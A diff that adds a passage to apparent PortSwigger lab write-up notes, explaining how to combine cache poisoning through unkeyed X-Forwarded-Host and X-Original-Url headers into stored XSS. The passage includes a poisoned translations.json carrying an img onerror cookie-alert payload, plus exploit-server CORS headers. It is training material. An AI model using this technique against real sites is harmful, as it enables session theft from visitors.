@@ -96,3 +96,45 @@ The content of the response should be a json, which `country` param will be unsa
 ```
 
 Poisoning the cache this way and serving this file solves the lab.
+
+## Combining web cache poisoning vulnerabilities
+
+Using Para Miner we are able to locate `x-forwarded-host` and `x-original-url` headers that are supported.
+
+Same situation as in the previous labs with poisoning the host in `data.host` variable which then is used to fetch data and pass in without sanitization to `innerHtml` sink. `x-forwarded-host` is unkeyed but is again reflected on the page, which makes the same technique usable.
+
+The problem here is that the English language chosen by default by victim is not translated and no unsafe `innerHtml` call would be invoked. That is guarded by `lang.toLowerCase() !== 'en'` check, so modifying response to contain malicious translation for english would not work. `select` tag options are created using the same response, but with `innerText`.
+
+By performing regular request to `/` and then adding `X-Original-Url: /setlang/es`, we notice that we receive `X-Cache: hit`, which means we hit the cache, so the `X-Original-Url` is unkeyed. After waiting for a while, sending regular request to the `/` with that header, results in language change, setting new language and performing redirection with a new query param `localized=1`. This means we could potentially posiono `/` to change a language and poison `/?localized=1` to fetch malicious data from our server to perform XSS.
+
+Ufortunately this 302 redirection response cannot be cached, because it contains the `Set-Cookie` header. But if we change `X-Original-Url` value to `/setlang\en` will perform redirect to `/setlang/en` and cache it.
+
+Now we have all the pieces to solve the lab. First poison `/` path with `X-Original-Url: /setlang\es`. Next poison `/?localized=1` with `X-Forwarded-Host: exploit-0a1b008804c63040828ddc8201e100d9.exploit-server.net` and then prepare our malicious payload which will be donwloaded.
+
+File should be available at `/resources/json/translations.json` and contain:
+
+```
+{
+    "en": {
+        "name": "English"
+    },
+    "es": {
+        "name": "espaÃ±ol",
+        "translations": {
+            "Return to list": "Volver a la lista",
+            "View details": "Ver detailes <img src=X onerror=alert(document.cookie) />",
+            "Description:": "DescripciÃ³n:"
+        }
+    }
+}
+```
+
+Response header should be configured to allow CORS:
+
+```
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Access-Control-Allow-Origin: https://0a17008b045e30d882a6dd2500a2007a.web-security-academy.net
+```
+
+Everyone visiting `/` home page will receive cached redirection to language change and then to `/?localized=1` with cookie set to Espaniol. Poisoned `/?localized=1` with reflected host header will fetch the data from our malicious server and pass unsafely to `innerHtml` solving the lab.
